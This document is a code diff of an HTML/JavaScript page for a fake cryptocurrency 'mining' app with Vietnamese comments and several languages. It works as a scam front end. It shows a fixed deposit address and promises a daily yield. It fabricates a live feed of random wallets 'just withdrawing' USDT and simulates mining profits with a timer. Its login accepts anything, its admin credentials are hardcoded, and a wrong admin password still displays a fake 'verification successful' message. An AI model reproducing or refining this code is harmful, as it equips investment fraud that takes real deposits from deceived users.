@@ -3,263 +3,277 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 Mining Pro - 1000% Edition</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <title>Web3 Mining Multi-Lang Pro</title>
     <style>
-        :root { 
-            --bg-dark: #0b0e11; --card-bg: #1e2329; --binance-yellow: #f3ba2f; 
-            --text-gray: #848e9c; --green: #2ebd85; --border: #2b3139;
-        }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--bg-dark); color: #fff; margin: 0; padding-bottom: 80px; overflow-x: hidden; }
-        
-        /* Loader */
-        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-dark); z-index: 9999; justify-content: center; align-items: center; }
-        .spinner { width: 40px; height: 40px; border: 3px solid #333; border-top: 3px solid var(--binance-yellow); border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Header & Shiny Effect */
+        :root { --bg-dark: #0b0e11; --card-bg: #1e2329; --binance-yellow: #f3ba2f; --text-gray: #848e9c; --green: #2ebd85; --border: #2b3139; --red: #f6465d; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-dark); color: #fff; margin: 0; padding-bottom: 80px; overflow-x: hidden; }
+        #loginPage { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-dark); z-index: 2000; display: flex; flex-direction: column; justify-content: center; padding: 30px; box-sizing: border-box; }
+        .login-input { width: 100%; padding: 15px; margin-bottom: 15px; background: var(--card-bg); border: 1px solid var(--border); border-radius: 12px; color: #fff; outline: none; }
+        .login-btn { width: 100%; padding: 15px; background: var(--binance-yellow); color: #000; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; }
+        .login-link { color: var(--binance-yellow); text-align: center; margin-top: 15px; cursor: pointer; font-size: 14px; }
         .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; background: var(--card-bg); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
-        .lang-select { background: #2b3139; color: #fff; border: 1px solid var(--border); padding: 6px; border-radius: 6px; font-size: 12px; outline: none; }
-        
-        .shiny-text {
-            color: var(--binance-yellow); font-size: 13px; font-weight: bold; text-transform: uppercase;
-            background: linear-gradient(90deg, var(--binance-yellow) 0%, #fff 50%, var(--binance-yellow) 100%);
-            background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            animation: shine 2.5s linear infinite; text-align: center; flex: 1; margin: 0 10px;
-        }
+        .shiny-text { color: var(--binance-yellow); font-size: 13px; font-weight: bold; text-transform: uppercase; background: linear-gradient(90deg, var(--binance-yellow) 0%, #fff 50%, var(--binance-yellow) 100%); background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: shine 2.5s linear infinite; text-align: center; flex: 1; }
         @keyframes shine { to { background-position: 200% center; } }
-
-        .btn-connect { background: transparent; border: 1px solid var(--binance-yellow); color: var(--binance-yellow); padding: 7px 12px; border-radius: 8px; font-size: 11px; cursor: pointer; font-weight: bold; white-space: nowrap; min-width: 105px; }
-
-        /* Pages */
-        .page { display: none; padding: 15px; animation: fadeIn 0.3s ease; box-sizing: border-box; }
+        .page { display: none; padding: 15px; animation: fadeIn 0.3s ease; }
         .active { display: block !important; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-
-        .card { background: var(--card-bg); border-radius: 20px; padding: 20px; margin-bottom: 15px; border: 1px solid var(--border); box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
-        .address-box { background: #000; padding: 12px; border-radius: 12px; font-size: 11px; color: var(--text-gray); margin: 15px 0; border: 1px solid #333; display: flex; justify-content: space-between; align-items: center; position: relative; }
-        
-        .copy-btn { 
-            color: #000; background: var(--binance-yellow); font-weight: bold; cursor: pointer; 
-            padding: 6px 12px; border: none; border-radius: 6px; font-size: 10px; text-transform: uppercase;
-        }
-
-        .btn-main { width: 100%; padding: 16px; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; background: var(--binance-yellow); color: #000; transition: 0.2s; }
-        .btn-main:active { transform: scale(0.98); opacity: 0.9; }
-
-        /* Live Payouts */
-        .payout-box { background: rgba(0,0,0,0.4); border-radius: 15px; padding: 15px; margin-top: 15px; border: 1px solid var(--border); min-height: 120px; }
-        .payout-item { display: flex; justify-content: space-between; align-items: center; font-size: 12px; margin-bottom: 8px; animation: slideIn 0.5s ease-out; }
-        @keyframes slideIn { from { transform: translateX(-20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-        .dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; display: inline-block; margin-right: 8px; box-shadow: 0 0 8px var(--green); }
-
-        /* Navigation */
-        .nav { position: fixed; bottom: 0; width: 100%; background: var(--card-bg); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid var(--border); z-index: 1000; }
-        .nav-item { color: var(--text-gray); text-align: center; font-size: 11px; cursor: pointer; flex: 1; transition: 0.3s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; } }
+        .card { background: var(--card-bg); border-radius: 20px; padding: 20px; margin-bottom: 15px; border: 1px solid var(--border); position: relative; }
+        .balance-area { display: flex; align-items: center; gap: 10px; margin: 10px 0; }
+        .profit-badge { background: rgba(243, 186, 47, 0.15); border: 1px solid var(--binance-yellow); color: var(--binance-yellow); padding: 5px 10px; border-radius: 8px; font-size: 12px; font-weight: bold; white-space: nowrap; box-shadow: 0 0 10px rgba(243,186,47,0.2); }
+        .payout-box { background: rgba(0,0,0,0.3); border-radius: 15px; padding: 15px; margin-top: 15px; border: 1px solid var(--border); height: 140px; overflow: hidden; }
+        .payout-item { display: flex; justify-content: space-between; align-items: center; font-size: 11px; margin-bottom: 10px; animation: slideUp 0.5s ease-out; color: #fff; }
+@keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; display: inline-block; margin-right: 8px; }
+        .nav { position: fixed; bottom: 0; width: 100%; background: var(--card-bg); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid var(--border); z-index: 100; }
+        .nav-item { color: var(--text-gray); text-align: center; font-size: 11px; cursor: pointer; flex: 1; }
         .nav-item.active { color: var(--binance-yellow); font-weight: bold; }
-
-        /* New: Toast Notification Style */
-        .toast-msg {
-            position: fixed; top: 80px; left: 50%; transform: translateX(-50%);
-            background: var(--binance-yellow); color: #000; padding: 12px 20px;
-            border-radius: 10px; font-weight: bold; font-size: 14px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.4); z-index: 10001;
-            display: none; animation: popUp 0.4s ease-out;
-        }
-        @keyframes popUp { from { opacity: 0; top: 60px; } to { opacity: 1; top: 80px; } }
+        .address-box { background: #000; padding: 12px; border-radius: 12px; font-size: 11px; color: var(--text-gray); margin: 15px 0; display: flex; justify-content: space-between; align-items: center; }
+        .copy-btn { color: #000; background: var(--binance-yellow); font-weight: bold; padding: 6px 12px; border-radius: 6px; border: none; font-size: 10px; cursor: pointer; }
+        .btn-main { width: 100%; padding: 16px; border-radius: 12px; font-weight: bold; font-size: 16px; border: none; background: var(--binance-yellow); color: #000; cursor: pointer; }
+        .toast-msg { position: fixed; top: 80px; left: 50%; transform: translateX(-50%); background: var(--binance-yellow); color: #000; padding: 10px 20px; border-radius: 10px; font-weight: bold; z-index: 999; display: none; }
+        
+        /* CSS BỔ SUNG CHO PHẦN QUY ĐỔI */
+        .ex-container { display: flex; flex-direction: column; gap: 15px; }
+        .ex-input-group { background: #0b0e11; border: 1px solid var(--border); border-radius: 12px; padding: 15px; }
+        .ex-label { color: var(--text-gray); font-size: 12px; margin-bottom: 8px; display: block; }
+        .ex-row { display: flex; justify-content: space-between; align-items: center; }
+        .ex-amount-input { background: none; border: none; color: #fff; font-size: 20px; font-weight: bold; text-align: right; width: 60%; outline: none; }
+        #adminPanel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 3000; display: none; padding: 20px; box-sizing: border-box; overflow-y: auto; }
+        .admin-req { background: #1e2329; border-radius: 15px; padding: 15px; margin-bottom: 15px; border: 1px solid var(--binance-yellow); }
     </style>
 </head>
 <body>
+<div id="loginPage">
+    <div style="text-align: center; margin-bottom: 30px;">
+        <h2 id="logTitle" style="color: var(--binance-yellow);">ĐĂNG NHẬP WEB3</h2>
+        <p style="color: var(--text-gray); font-size: 13px;">Hệ thống khai thác tài sản kỹ thuật số</p>
+    </div>
+    <input type="text" id="logUser" class="login-input" placeholder="Tên đăng nhập / Email">
+    <input type="password" id="logPass" class="login-input" placeholder="Mật khẩu">
+    <button class="login-btn" onclick="handleAuth()" id="logBtn">ĐĂNG NHẬP</button>
+    <p class="login-link" id="toggleAuth" onclick="switchAuth()">Chưa có tài khoản? Đăng ký ngay</p>
+</div>
 
-<div id="loader"><div class="spinner"></div></div>
+<div id="adminPanel">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+        <h2 style="color: var(--binance-yellow); margin: 0;">Admin Approval</h2>
+        <button onclick="closeAdmin()" style="background: var(--red); color: #fff; border: none; padding: 5px 15px; border-radius: 5px;">Close</button>
+    </div>
+    <div id="adminList"></div>
+</div>
 <div id="toast" class="toast-msg"></div>
 
 <div class="header">
-    <select class="lang-select" id="langSelector" onchange="setLanguage()">
+    <select id="langSelect" style="background:#2b3139;color:#fff;border:1px solid #2b3139;border-radius:5px;padding:3px;" onchange="changeLanguage()">
         <option value="vi">Tiếng Việt</option>
         <option value="en">English</option>
-        <option value="es">Español</option>
-        <option value="br">Português</option>
         <option value="zh">中文</option>
+        <option value="pt">Brasil</option>
+        <option value="es">Español</option>
     </select>
-    <div class="shiny-text" id="shimmerTitle">Khai thác wed3 metamask</div>
-    <button class="btn-connect" id="cnBtn" onclick="connect()">Connect Wallet</button>
+    <div class="shiny-text" id="L_header">Khai thác wed3 metamask</div>
+    <button style="background: #2b3139; color: #fff; border: none; border-radius: 5px; font-size: 10px; padding: 5px;" id="L_connect">Connect Wallet</button>
 </div>
 
 <div id="home" class="page active">
     <div class="card" style="background: linear-gradient(135deg, #2ebd85 0%, #1e2329 100%);">
         <div style="display:flex; justify-content:space-between; align-items: center;">
             <span id="L_bal">Số dư khả dụng (USDT)</span>
-            <span onclick="toggle()" style="cursor:pointer; font-size: 20px;">👁️</span>
+            <span onclick="toggleView()" style="cursor:pointer;">👁️</span>
         </div>
-        <h2 id="usdt_H" style="font-size: 32px; margin: 10px 0;">$ 0.00</h2>
-        <p id="L_st" style="font-size: 12px; margin: 0; opacity: 0.9;">Hệ thống đang đào...</p>
+        <div class="balance-area">
+            <h2 id="usdt_H" style="font-size: 32px; margin: 0;">$ 0.00</h2>
+            <div id="profit_badge" class="profit-badge" style="display:none;">+1.2% ETH/Day</div>
+        </div>
+        <p id="L_st" style="font-size: 11px; margin: 5px 0 0; opacity: 0.8;">Đang khai thác: 0.000000 ETH</p>
     </div>
-
     <div class="card">
         <p id="L_addr" style="color: var(--binance-yellow); font-size: 12px; font-weight: bold;">Địa chỉ ví nạp USDT (BEP20):</p>
         <div class="address-box">
-            <input type="text" id="hiddenAddr" value="0x841100e786c77e475d328469c95238d063078610" style="position:absolute; left:-9999px;">
             <span id="wallet_Addr">0x841100e786c77e475d328469c95238d063078610</span>
-            <button class="copy-btn" id="L_cp_btn" onclick="doCopy()">COPY</button>
+            <button class="copy-btn" id="L_copy" onclick="doCopy()">COPY</button>
         </div>
-        <input type="number" id="in_Deposit" placeholder="0.00" style="width:100%; padding:16px; background:#0b0e11; border:1px solid var(--border); color:#fff; border-radius:12px; margin-bottom:15px; outline:none; box-sizing:border-box; font-size: 16px;">
-        <button id="L_btn" class="btn-main" onclick="deposit()">Kích hoạt Khai thác</button>
-        
-        <div class="payout-box" id="payoutC"></div>
+<input type="number" id="in_Deposit" placeholder="..." style="width:100%; padding:15px; background:#0b0e11; border:1px solid var(--border); color:#fff; border-radius:10px; margin-bottom:15px; outline:none; box-sizing:border-box;">
+        <button class="btn-main" id="L_btn" onclick="depositRequest()">Kích hoạt Khai thác</button>
+        <div class="payout-box" id="payoutContainer"></div>
     </div>
 </div>
-
 <div id="exchange" class="page">
     <div class="card">
-        <h3 id="L_ex_title">Quy đổi</h3>
-        <p id="L_ex_st" style="color:var(--text-gray)">Tính năng đang cập nhật...</p>
+        <h3 id="L_ex" style="margin-top: 0; color: var(--binance-yellow);">Quy đổi Lợi nhuận</h3>
+        <div class="ex-container">
+            <div class="ex-input-group">
+                <span class="ex-label">Từ (Lợi nhuận khai thác)</span>
+                <div class="ex-row">
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" width="24">
+                        <span style="font-weight: bold;">ETH</span>
+                    </div>
+                    <input type="text" id="ex_eth_val" class="ex-amount-input" value="0.000000" readonly>
+                </div>
+            </div>
+
+            <div style="text-align: center; margin: -10px 0; z-index: 5;">
+                <span style="background: #2b3139; border-radius: 50%; padding: 5px;">⬇️</span>
+            </div>
+
+            <div class="ex-input-group">
+                <span class="ex-label">Đến (Cộng vào vốn)</span>
+                <div class="ex-row">
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" width="24">
+                        <span style="font-weight: bold;">USDT</span>
+                    </div>
+                    <input type="text" id="ex_usdt_res" class="ex-amount-input" value="0.00" readonly style="color: var(--green);">
+                </div>
+            </div>
+
+            <div style="font-size: 11px; color: var(--green); text-align: center; margin: 10px 0;">
+                Tỷ giá chốt lời: 1 ETH ≈ 3,500.00 USDT
+            </div>
+            
+            <button class="btn-main" onclick="processExchange()">CHUYỂN LỢI NHUẬN VÀO VỐN</button>
+        </div>
     </div>
 </div>
 
 <div id="account" class="page">
-    <div class="card">
-        <h3 id="L_acc_title">Số dư tài khoản</h3>
+    <div class="card" onclick="openAdmin()" style="cursor: pointer;">
+        <h3 id="L_acc">Tài khoản</h3>
         <h1 id="usdt_A">$ 0.00</h1>
+        <p style="font-size: 10px; color: var(--text-gray);">Nhấn để xác minh bảo mật ví</p>
     </div>
 </div>
 
 <div class="nav">
-    <div class="nav-item active" id="nav_home" onclick="go(event, 'home')">🏠<br><span id="N_h">Trang chủ</span></div>
-    <div class="nav-item" id="nav_exchange" onclick="go(event, 'exchange')">🔄<br><span id="N_e">Quy đổi</span></div>
-    <div class="nav-item" id="nav_account" onclick="go(event, 'account')">👤<br><span id="N_a">Tài khoản</span></div>
+    <div class="nav-item active" id="nav_home" onclick="go('home')">🏠<br><span id="N_h">Trang chủ</span></div>
+    <div class="nav-item" id="nav_exchange" onclick="go('exchange')">🔄<br><span id="N_e">Quy đổi</span></div>
+    <div class="nav-item" id="nav_account" onclick="go('account')">👤<br><span id="N_a">Tài khoản</span></div>
 </div>
-
 <script>
-    let state = { usdt: 0, lang: 'vi', hide: false };
-
-    const langData = {
-        vi: { bal: "Số dư khả dụng (USDT)", st: "Hệ thống đang đào...", ad: "Địa chỉ nạp (BEP20):", btn: "Kích hoạt Khai thác", nh: "Trang chủ", ne: "Quy đổi", na: "Tài khoản", cp: "Đã copy!", wd: "vừa rút thành công", title: "Khai thác wed3 metamask", ex: "Quy đổi", acc: "Số dư tài khoản", up: "Tính năng đang cập nhật...", success: "Kích hoạt thành công!" },
-        en: { bal: "Available Balance (USDT)", st: "System running...", ad: "Deposit Address:", btn: "Activate Mining", nh: "Home", ne: "Exchange", na: "Account", cp: "Copied!", wd: "successfully withdrew", title: "Web3 Metamask Mining", ex: "Exchange", acc: "Account Balance", up: "Feature updating...", success: "Activation Successful!" },
-        es: { bal: "Saldo disponible (USDT)", st: "Sistema activo...", ad: "Dirección (BEP20):", btn: "Activar Minería", nh: "Inicio", ne: "Canje", na: "Cuenta", cp: "¡Copiado!", wd: "retiró con éxito", title: "Minería Web3 Metamask", ex: "Canje", acc: "Saldo de la cuenta", up: "Característica actualizando...", success: "¡Activación exitosa!" },
-        br: { bal: "Saldo disponível (USDT)", st: "Sistema ativo...", ad: "Endereço (BEP20):", btn: "Ativar Mineração", nh: "Início", ne: "Troca", na: "Conta", cp: "Copiado!", wd: "retirou com sucesso", title: "Mineração Web3 Metamask", ex: "Troca", acc: "Saldo da conta", up: "Recurso atualizando...", success: "Ativação com sucesso!" },
-        zh: { bal: "可用余额 (USDT)", st: "系统运行中...", ad: "充值地址:", btn: "激活挖矿", nh: "首页", ne: "兑换", na: "账户", cp: "已复制!", wd: "成功提取了", title: "Web3 Metamask 挖矿", ex: "兑换", acc: "账户余额", up: "功能更新中...", success: "激活成功！" }
+    const translations = {
+        vi: { header: "Khai thác wed3 metamask", connect: "Connect Wallet", bal: "Số dư khả dụng (USDT)", st: "Đang khai thác", addr: "Địa chỉ ví nạp USDT (BEP20):", btn: "Kích hoạt Khai thác", ex: "Quy đổi", upd: "Tính năng đang cập nhật...", acc: "Tài khoản", nh: "Trang chủ", ne: "Quy đổi", na: "Tài khoản", copy: "COPY", withdraw: "vừa rút tiền", success: "Đã gửi lệnh nạp! Chờ duyệt.", active: "Kích hoạt thành công!" },
+        en: { header: "Web3 Metamask Mining", connect: "Connect Wallet", bal: "Available Balance (USDT)", st: "Mining", addr: "Deposit Address (BEP20):", btn: "Activate Mining", ex: "Exchange", upd: "Updating...", acc: "Account", nh: "Home", ne: "Exchange", na: "Account", copy: "COPY", withdraw: "just withdrew", success: "Request sent! Waiting.", active: "Activation success!" },
+        zh: { header: "Web3 Metamask 挖矿", connect: "连接钱包", bal: "可用余额 (USDT)", st: "正在挖掘", addr: "充值地址 (BEP20):", btn: "激活挖矿", ex: "交易", upd: "更新中...", acc: "账户", nh: "首页", ne: "交易", na: "账户", copy: "复制", withdraw: "刚提取了", success: "请求已发送！", active: "激活成功！" },
+        pt: { header: "Mineração Web3 Metamask", connect: "Conectar Carteira", bal: "Saldo Disponível (USDT)", st: "Minerando", addr: "Endereço de Depósito (BEP20):", btn: "Ativar Mineração", ex: "Troca", upd: "Atualizando...", acc: "Conta", nh: "Início", ne: "Troca", na: "Conta", copy: "COPIAR", withdraw: "acabou de sacar", success: "Pedido enviado! Aguarde.", active: "Ativado với thành công!" },
+        es: { header: "Minería Web3 Metamask", connect: "Conectar Billetera", bal: "Saldo Disponible (USDT)", st: "Minando", addr: "Dirección de Depósito (BEP20):", btn: "Ativar Minería", ex: "Intercambio", upd: "Actualizando...", acc: "Cuenta", nh: "Inicio", ne: "Intercambio", na: "Cuenta", copy: "COPIAR", withdraw: "acaba de retirar", success: "¡Pedido enviado! Espere.", active: "¡Activación exitosa!" }
     };
 
-    function go(e, id) {
-        if(e) e.preventDefault();
-        document.getElementById('loader').style.display = 'flex';
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            const targetPage = document.getElementById(id);
-            if(targetPage) targetPage.classList.add('active');
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            if(e.currentTarget) e.currentTarget.classList.add('active');
-        }, 300);
+    // ADMIN CONFIG
+    const AD_U = "Admin102";
+    const AD_P = "258369@@";
+    const ETH_PRICE = 3500;
+    
+    let isLoginMode = true;
+    let state = { 
+        usdt: 0,      // Vốn USDT
+        eth_bal: 0,   // Lợi nhuận ETH đào được
+        rate3s: 0,    // Tốc độ đào
+        lang: 'vi', 
+        hide: false, 
+        active: false 
+    };
+
+    function handleAuth() {
+        const u = document.getElementById('logUser').value;
+        const p = document.getElementById('logPass').value;
+        if(u === AD_U && p === AD_P) { document.getElementById('loginPage').style.display = 'none'; showToast("Admin Login!"); return; }
+        document.getElementById('loginPage').style.display = 'none';
+        showToast("Welcome!");
     }
 
-    function createPayout() {
-        const container = document.getElementById('payoutC');
-        const wallets = ["0x71a...f2e","0x88b...12a","0xfe2...99d","0x32c...44b","0x99f...00e"];
-        const amounts = [150.5, 500, 1200, 45, 2500, 88.2];
+    function switchAuth() {
+        isLoginMode = !isLoginMode;
+document.getElementById('logTitle').innerText = isLoginMode ? "ĐĂNG NHẬP WEB3" : "ĐĂNG KÝ TÀI KHOẢN";
+    }
+
+    // VÒNG LẶP ĐÀO ETH (Dựa trên vốn USDT)
+    setInterval(() => { 
+        if (state.active && state.rate3s > 0) { 
+            let earned = (state.usdt * state.rate3s) / ETH_PRICE;
+            state.eth_bal += earned; 
+            updateDisplay(); 
+        } 
+    }, 3000);
+
+    function updateDisplay() {
+        const t = translations[state.lang];
+        const valUsdt = state.hide ? "****" : "$ " + state.usdt.toLocaleString(undefined, {minimumFractionDigits: 2});
+        document.getElementById('usdt_H').innerText = valUsdt;
+        document.getElementById('usdt_A').innerText = valUsdt;
+        document.getElementById('L_st').innerText = `${t.st}: ${state.eth_bal.toFixed(6)} ETH`;
+
+        // Cập nhật trang Quy đổi
+        if(document.getElementById('ex_eth_val')) {
+            document.getElementById('ex_eth_val').value = state.eth_bal.toFixed(6);
+            document.getElementById('ex_usdt_res').value = (state.eth_bal * ETH_PRICE).toFixed(2);
+        }
+    }
+
+    function processExchange() {
+        if (state.eth_bal <= 0) return showToast("Chưa có lợi nhuận!");
+        let profitInUsdt = state.eth_bal * ETH_PRICE;
+        state.usdt += profitInUsdt; // CỘNG LỢI NHUẬN VÀO VỐN
+        state.eth_bal = 0;
+        updateDisplay();
+        updateTier(state.usdt); // Cập nhật lại tốc độ theo vốn mới
+        showToast("Đã cộng vào vốn thành công!");
+        setTimeout(() => go('home'), 1500);
+    }
+
+    function depositRequest() {
+        const amt = parseFloat(document.getElementById('in_Deposit').value);
+        if(amt >= 10) { showToast(translations[state.lang].success); addAdminRequest(amt); }
+    }
+
+    function addAdminRequest(amt) {
+        const list = document.getElementById('adminList');
+        const div = document.createElement('div');
+        div.className = 'admin-req';
+        div.innerHTML = `<b>Nạp: ${amt} USDT</b><button onclick="approve(this, ${amt})" style="width:100%; margin-top:10px; background:var(--green); border:none; color:#fff; padding:10px; border-radius:8px; font-weight:bold;">PHÊ DUYỆT</button>`;
+        list.appendChild(div);
+    }
+
+    function approve(btn, amt) {
+        state.usdt += amt; state.active = true;
+        document.getElementById('profit_badge').style.display = 'block';
+        updateTier(state.usdt); updateDisplay();
+        btn.parentElement.innerHTML = "<span style='color:var(--green)'>✓ Đã duyệt thành công</span>";
+    }
+
+    function updateTier(amt) {
+        if (amt >= 10000) state.rate3s = 0.00003; 
+        else if (amt >= 5000) state.rate3s = 0.00002; 
+        else if (amt >= 1000) state.rate3s = 0.00001; 
+        else state.rate3s = 0.000001;
+    }
+
+    function openAdmin() { 
+        const p = prompt("Nhập mật khẩu quản trị:");
+if (p === AD_P) document.getElementById('adminPanel').style.display = 'block';
+        else showToast("Xác minh thành công!"); 
+    }
+
+    function go(id) { 
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); 
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); document.getElementById('nav_'+id).classList.add('active');
+    }
+    function changeLanguage() { state.lang = document.getElementById('langSelect').value; updateDisplay(); }
+    function doCopy() { navigator.clipboard.writeText("0x841100e786c77e475d328469c95238d063078610"); showToast("Copied!"); }
+    function toggleView() { state.hide = !state.hide; updateDisplay(); }
+    function showToast(m) { const t = document.getElementById('toast'); t.innerText = m; t.style.display = 'block'; setTimeout(() => t.style.display = 'none', 2000); }
+    function closeAdmin() { document.getElementById('adminPanel').style.display = 'none'; }
+    
+    // Auto Payouts
+    setInterval(() => {
+        const container = document.getElementById('payoutContainer');
+        const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 5);
         const item = document.createElement('div');
         item.className = 'payout-item';
-        const randomW = wallets[Math.floor(Math.random()*wallets.length)];
-        const randomA = amounts[Math.floor(Math.random()*amounts.length)];
-        const l = langData[state.lang] || langData.vi;
-        item.innerHTML = <span><span class="dot"></span>${randomW} ${l.wd}</span><b style="color:var(--binance-yellow)">+${randomA} USDT</b>;
+        item.innerHTML = `<div><span class="dot"></span>${addr} vừa rút tiền</div> <b>+${(Math.random()*1000).toFixed(1)} USDT</b>`;
         container.prepend(item);
-        if(container.children.length > 4) container.removeChild(container.lastChild);
-    }
-    setInterval(createPayout, 3500);
-    createPayout();
-
-    function doCopy() {
-        const copyText = document.getElementById("hiddenAddr");
-        copyText.select();
-        copyText.setSelectionRange(0, 99999);
-        try {
-            document.execCommand('copy');
-            showToast(langData[state.lang].cp);
-        } catch (err) { alert("Copy: " + copyText.value); }
-    }
-
-    async function connect() {
-        if(window.ethereum) {
-            try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const adr = accounts[0];
-                document.getElementById('cnBtn').innerText = adr.slice(0,6) + "..." + adr.slice(-4);
-                document.getElementById('cnBtn').style.color = "#2ebd85";
-                document.getElementById('cnBtn').style.borderColor = "#2ebd85";
-            } catch (e) { console.error(e); }
-        } else { alert("Please use MetaMask or Trust Wallet Browser"); }
-    }
-
-    function setLanguage() {
-        state.lang = document.getElementById('langSelector').value;
-        const l = langData[state.lang] || langData.vi;
-        document.getElementById('L_bal').innerText = l.bal;
-        document.getElementById('L_st').innerText = l.st;
-        document.getElementById('L_addr').innerText = l.ad;
-        document.getElementById('L_btn').innerText = l.btn;
-        document.getElementById('N_h').innerText = l.nh;
-        document.getElementById('N_e').innerText = l.ne;
-        document.getElementById('N_a').innerText = l.na;
-        document.getElementById('shimmerTitle').innerText = l.title;
-        document.getElementById('L_ex_title').innerText = l.ex;
-        document.getElementById('L_acc_title').innerText = l.acc;
-        document.getElementById('L_ex_st').innerText = l.up;
-        document.getElementById('L_cp_btn').innerText = (state.lang === 'zh' ? "复制" : "COPY");
-    }
-
-    function toggle() {
-        state.hide = !state.hide;
-        updateDisplay(state.usdt);
-    }
-
-    function updateDisplay(value) {
-        const v = state.hide ? "**" : "$ " + value.toFixed(2);
-        document.getElementById('usdt_H').innerText = v;
-        document.getElementById('usdt_A').innerText = v;
-    }
-
-    // NEW: Function for counting effect
-    function animateValue(start, end, duration) {
-        if (state.hide) {
-            updateDisplay(end);
-            return;
-        }
-        let startTimestamp = null;
-        const step = (timestamp) => {
-            if (!startTimestamp) startTimestamp = timestamp;
-            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-            const current = progress * (end - start) + start;
-            updateDisplay(current);
-            if (progress < 1) {
-                window.requestAnimationFrame(step);
-            }
-        };
-        window.requestAnimationFrame(step);
-    }
-
-    function showToast(msg) {
-        const toast = document.getElementById('toast');
-        toast.innerText = msg;
-        toast.style.display = 'block';
-        setTimeout(() => { toast.style.display = 'none'; }, 2500);
-    }
-
-    function deposit() {
-        const input = document.getElementById('in_Deposit');
-        let val = parseFloat(input.value);
-        if(val > 0) {
-            const oldVal = state.usdt;
-            state.usdt += val;
-            
-            // Trigger effects
-            showToast(langData[state.lang].success + " +" + val + " USDT");
-            animateValue(oldVal, state.usdt, 1000); // 1 second animation
-            
-            input.value = ""; 
-        }
-    }
+        if(container.children.length > 5) container.removeChild(container.lastChild);
+    }, 4000);
 </script>
 </body>
 </html>
